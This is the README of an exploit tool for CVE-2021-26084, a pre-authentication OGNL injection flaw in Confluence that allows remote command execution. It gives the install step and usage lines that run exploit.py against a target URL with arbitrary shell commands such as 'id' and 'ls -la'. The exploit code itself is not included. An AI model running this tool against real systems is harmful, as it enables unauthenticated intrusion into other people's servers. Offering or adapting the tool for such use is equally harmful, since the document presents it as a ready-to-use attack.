# CVE-2021-26084
CVE-2021-26084 - Confluence Pre-Auth RCE | OGNL injection 

- Install requirements
```
pip3 install -r requirements.txt
```

- Run exploit

```
USE: python3 exploit.py https://target.com CMD
Ex: python3 exploit.py https://target.com id
Ex: python3 exploit.py https://target.com 'ls -la'

```